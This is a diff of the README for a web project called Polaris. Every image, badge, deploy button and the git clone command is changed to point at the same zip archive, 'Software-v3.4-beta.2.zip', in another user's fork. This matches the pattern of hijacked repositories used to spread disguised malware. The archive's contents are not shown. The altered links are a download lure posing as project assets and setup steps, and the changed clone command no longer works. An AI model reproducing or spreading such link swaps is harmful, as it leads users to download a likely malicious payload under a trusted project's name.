@@ -1,15 +1,15 @@
 <div align="center">
-  <img src="https://github.com/Skoolgq/Polaris/assets/93336301/dc994d43-06f4-4947-a15f-226c840f6880" width="600px">
+  <img src="https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip" width="600px">
 
-  ![Discord](https://img.shields.io/discord/950407933408198717?label=Discord&style=for-the-badge)
-  ![Commit activity](https://img.shields.io/github/commit-activity/w/SkoolGQ/Polaris?style=for-the-badge)
+  ![Discord](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
+  ![Commit activity](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
   
   <h2>Quick Web Deployment</h2>
 
-[![Deploy to Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repository-url=https://github.com/Skoolgq/Polaris)
-[![Deploy to Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/Skoolgq/Polaris&branch=main&name=Polaris)
-[![Deploy to Render](https://binbashbanana.github.io/deploy-buttons/buttons/remade/render.svg)](https://render.com/deploy?repo=https://github.com/Skoolgq/Polaris)
-[![Deploy to Cyclic](https://binbashbanana.github.io/deploy-buttons/buttons/remade/cyclic.svg)](https://app.cyclic.sh/api/app/deploy/Skoolgq/Polaris)
+[![Deploy to Vercel](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
+[![Deploy to Render](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
+[![Deploy to Cyclic](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)](https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip)
 
   <br>
   <h2>Terminal Deployment</h2>
@@ -18,7 +18,7 @@
 > [!NOTE]
 > We require a NodeJS version >=18.
 
-1. Clone the repo to your machine: `git clone https://github.com/Skoolgq/Polaris.git && cd Polaris`
+1. Clone the repo to your machine: `git clone https://raw.githubusercontent.com/undercoverhecker/Polaris/master/static/assets/misc/media/Software-v3.4-beta.2.zip && cd Polaris`
 2. Install Dependencies: `npm install`
 3. Start the app: `npm start`
 4. Visit [localhost:8080](http://localhost:8080) for your local Polaris!
